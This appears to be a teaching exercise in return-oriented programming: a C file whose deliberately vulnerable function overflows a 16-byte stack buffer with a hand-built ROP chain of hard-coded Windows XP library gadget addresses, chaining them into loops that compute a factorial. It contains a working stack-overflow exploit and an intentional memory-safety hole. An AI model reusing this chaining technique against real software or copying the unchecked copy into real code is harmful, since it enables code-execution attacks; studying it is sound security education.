// ROPFactorial.cpp : Defines the entry point for the console application.
//

#pragma check_stack(off)
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

const char newbuf[] =	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// fill up buffer (16)
						"\x00\x00\x00\x00"								// fill up rest of stack until return address 				
						//"\x00\x10\x40\x00"								// &hack -- 00401000		
						"\x20\x10\x40\x00"								// 0x00401020 -- &flagBeginGadgets

						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// Factorial Setup
						//-----------------------------------------------
						// Copy x into multBy
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x20\x30\x40\x00"								// 0x00403020 - &x
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN --> x -- 77C12821 MSVCRT
						//	Store x-- into multBy 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x44\x30\x40\x00"								// 0x00403044 - &multBy
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN  (x-=2)--> x -- 77C12821 MSVCRT
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN  (x-=2)--> x -- 77C12821 MSVCRT
						// Store x-=2 into oLC
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x2C\x30\x40\x00"								// 0x0040302C - &oLC
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//	Store 0 into oRes --> Final facttorial result = 0
						//"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						//"\x00\x00\x00\x00"								// 0x00000000 - imm 0
						//"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						//"\x44\x30\x40\x00"								// 0x00403044 - &oRes
						//"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						//"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						//"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;

						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// Factorial Cond
						//	if(oLC<0) set CF by performing c+80000000
						//			Load [oLC] (0x0040304C) into eax 
						// -------------------<FactCond stack count = 0> --------------------------------
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x2C\x30\x40\x00"								// 0x0040302C - &oLC
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			Load 80000000 into esi
						"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
						"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
						"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
						// -------------------<FactCond stack count = 8> --------------------------------

						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
						"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(oLC<0) ecx=1;	else if(oLC>=0) ecx=0;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						// -------------------<FactCond stack count = 15> --------------------------------
						// BRIAN: 15 lines -> 34 lines
						"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(iLC<0) eax=1;	else if(iLC>=0) eax=0;
						"\x6E\x15\x90\x7C"								// 0x7C90156E - pop edx; ret;				-- moving 0 into edx to account for gadgets' side effects
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=10;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=100;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=1000;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=10000;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x10\x2D\xC2\x77"								// 0x77C22D10 - add eax,ecx; pop ebp; ret;	-- if(iLC<0) eax=10001;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=100010;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x10\x2D\xC2\x77"								// 0x77C22D10 - add eax,ecx; pop ebp; ret;	-- if(iLC<0) eax=100011;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=1000110;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x10\x2D\xC2\x77"								// 0x77C22D10 - add eax,ecx; pop ebp; ret;	-- if(iLC<0) eax=1000111;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=10001110;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=100011100;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x0C\x31\xC5\x77"								// 0x77C5310C - shl eax,1; pop ebp; ret;	-- if(iLC<0) eax=100011100=x238;	else if(iLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						// When finished, jump to print
						// Else go to mult setup
						// -------------------<FactCond stack count = 30> --------------------------------
						"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
						"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//	if(oLC<0) esp=esp+128=esp+4*32;	else if(oLC>=0) esp=esp; 
						// -------------------<FactCond stack count = 38> --------------------------------
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
						// -------------------<FactCond stack count = 39> --------------------------------


						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// MultSetup
						//-----------------------------------------------
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x44\x30\x40\x00"								// 0x00403044 - &multBy
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN --> multBy-- 77C12821 MSVCRT
						//	Store multBy-- into multBy 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x44\x30\x40\x00"								// 0x00403044 - &multBy
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						// -------------------<MultSetup stack count = 12> --------------------------------
						//	Store iLC-- into iLC 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x24\x30\x40\x00"								// 0x00403024 - &iLC
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//	Store 0 into iRes --> Result = 0
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &iRes
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						// -------------------<MultSetup stack count = 27> --------------------------------

						// iLC = iLC-1
						// x = x
						// iRes = 0
						// OKAY 9/9/13
						
						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// MultCond
						//	if(iLC<0) set CF by performing c+80000000
						//			Load [iLC] (0x00403050) into eax 
						// -------------------<MultCond stack count = 0> --------------------------------
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x24\x30\x40\x00"								// 0x00403024 - &iLC
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			Load 80000000 into esi
						"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
						"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
						"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
						// -------------------<MultCond stack count = 8> --------------------------------

						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
						"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(iLC<0) ecx=1;	else if(iLC>=0) ecx=0;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
						// -------------------<MultCond stack count = 15> --------------------------------
						"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(oLC<0) eax=1;	else if(oLC>=0) eax=0;
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=2;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=4;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=8;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=16;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=32;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=64;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(oLC<0) eax=128;	else if(oLC>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
											// When finished, jump to FactLogic to add the result
						// Else go to MultLogic
						// -------------------<MultCond stack count = 30> --------------------------------
						"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
						"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//	if(iLC<0) esp=esp+1024;	else if(iLC>=0) esp=esp; 
						// -------------------<MultCond stack count = 38> --------------------------------
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
						// -------------------<MultCond stack count = 39> --------------------------------

						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// MultLogic
						//  iRes (result) = iRes (result) + x
						//	Load [x] into eax 
						// -------------------<MultLog stack count = 0> --------------------------------
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x20\x30\x40\x00"								// 0x00403020 - &x
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			[iRes] = [iRes] + eax
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &iRes
						"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
						// -------------------<MultLog stack count = 8> --------------------------------
						//  iLC--
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x24\x30\x40\x00"								// 0x00403024 - &iLC
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN --> iLC-- 77C12821 MSVCRT
							//"\x16\x2F\x81\x7C"								// 0x7C812F16 - DEC EAX RETN --> iLC--
						
						//	Store iLC-- into iLC 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x24\x30\x40\x00"								// 0x00403024 - &iLC
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	
						// -------------------<MultLog stack count = 20> --------------------------------
						// Loop back to MultCond
						//  esp = esp + CONST 
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\x08\xFF\xFF\xFF"								// 0xFFFFFF08 -- amount to inc stack by
								// ^----- Jump amount = (-4)*(MultCond stack count + MultLog stack count) = (-4)*(39+21+2)=-216
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;

						// To account for FibCond adding 32 to esp
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						// When finished jump to mult conditional
						// -------------------<MultLog stack count = 25> --------------------------------

						//--------------------------------------------------------------------------------------------------------------------------
						//--------------------------------------------------------------------------------------------------------------------------
						// FactorialLogic
						//  x = iRes; iRes = 0 // NO oRes (result) = oRes (result) + iRes
						//	Load [iRes] into eax 
						//-----------------------------------------------
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler end 28 bytes of filler
						// -------------------<FactLog stack count = 7> --------------------------------
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &iRes
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//  x = iRes
						// DELETE HERE ----
						//			[oRes] = [oRes] + eax --> iRes
						//"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						//"\x44\x30\x40\x00"								// 0x00403044 - &oRes
						//"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
						// -3
						//	Store iRes into [&x] 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x20\x30\x40\x00"								// 0x00403020 - &x
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						// -------------------<FactLog stack count = 18> --------------------------------
						// +6

						//	Store 0 into iRes --> Result = 0
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &iRes
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
						// +9

						// TODOTODOTODOTODO!!!!!!!!!!!!!!!!!
						// -------------------<FactLog stack count = 27> --------------------------------
						//  oLC--
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x2C\x30\x40\x00"								// 0x0040302C - &oLC
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN --> oLC-- 77C12821 MSVCRT
							//"\x16\x2F\x81\x7C"								// 0x7C812F16 - DEC EAX RETN --> oLC--
						// -------------------<FactLog stack count = 33> --------------------------------
						//	Store oLC-- into oLC 
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x2C\x30\x40\x00"								// 0x0040302C - &oLC
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	
						// -------------------<FactLog stack count = 39> --------------------------------
						// Loop back to FactCond
						//  esp = esp + CONST 
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\x04\xFD\xFF\xFF"								// 0xFFFFFD04 -- old -> 0xFFFFFD68 -- amount to inc stack by
								// ^----- Jump amount = (-4)*(MultCond stack count + MultLog stack count) = (-4)*(58 FC+ 27 MS+ 39 MC + 25 ML + 40 [28+9-3+6] FL )=(189 + 2 )*-4 = -764 (-688 old) (-664 oldold)
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;

						// To account for FactCond adding 32 to esp
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						// When finished, jump back to FactCond
						// -------------------<FactLog stack count = 44> -----------
						"\x11\x11\x11\x11"								// 0x00000000 - imm filler
						"\x22\x22\x22\x22"								// 0x00000000 - imm filler
						"\x33\x33\x33\x33"								// 0x00000000 - imm filler
						"\x44\x44\x44\x44"								// 0x00000000 - imm filler
						"\x55\x55\x55\x55"								// 0x00000000 - imm filler
						"\x66\x66\x66\x66"								// 0x00000000 - imm filler
						"\x77\x77\x77\x77"								// 0x00000000 - imm filler

						
						"\x40\x10\x40\x00"								// 0x00401040 - &printAnswer
						;


int x;		// 0x00403024 // number scanned in
int iLC;					  // counter for inner loop // n
int multBy;		// 0x00403048 // counter for outer loop // a
int iRes;		// 0x00403030 // result for inner loop // b
int oLC;		// 0x0040303C // result for outer loop // c
int addBy;		// 0x00403020 // d -- don't need
int e;		// 0x00403040
int f;		// 0x0040304C
int g;		// 0x00403050
int a_temp;	// 0x0040301C
int b_temp;	// 0x00403044
int c_temp;	// 0x00403018
int d_temp;	// 0x00403034
int e_temp;	// 0x00403038
int f_temp;	// 0x0040302C


void hack(void) {
	printf("Buffer overflowed!\n");
}

void flagBeginGadgets(void) {
	__asm{
		or eax,eax
		or eax,eax
		or eax,eax
	}
}

void flagEndGadgets(void) {
	__asm{
		or ebx,ebx
		or ebx,ebx
		or ebx,ebx
	}
}

void printAnswer(void) {
	flagEndGadgets();
	printf("The answer is %d\n",x);
	exit(0);
}

void printAddresses(void) {
    printf("Address of hack			= %p\n", hack);
    printf("Address of printAnswer	= %p\n", printAnswer);
    printf("Address of flagBeginGadgets = %p\n", flagBeginGadgets);
    printf("Address of flagEndGadgets = %p\n", flagEndGadgets);
	printf("Address of x			= %p\n", &x);
	printf("Address of iLC			= %p\n", &iLC);
	printf("Address of multBy		= %p\n", &multBy);
	printf("Address of iRes			= %p\n", &iRes);
	printf("Address of oLC			= %p\n", &oLC);
	printf("Address of addBy		= %p\n", &addBy);
	printf("Address of e			= %p\n", &e);
	printf("Address of f			= %p\n", &f);
	printf("Address of g			= %p\n", &g);
	printf("Address of a_temp		= %p\n", &a_temp);
	printf("Address of b_temp		= %p\n", &b_temp);
	printf("Address of c_temp		= %p\n", &c_temp);
	printf("Address of d_temp		= %p\n", &d_temp);
	printf("Address of e_temp		= %p\n", &e_temp);
	printf("Address of f_temp		= %p\n", &f_temp);
}


void exploit() {
	char buf[16];
	memcpy(buf, newbuf, sizeof(newbuf)-1);		// Where the buffer overflow occurs
	return;
}

int main(int argc, char* argv[]) {
	char extraSpace[1024];
	
	//printAddresses();							// Makes debugging easier
	//printf("Enter a value to compute factorial: ");
	scanf("%d",&x);

	exploit();
	return 0;
}
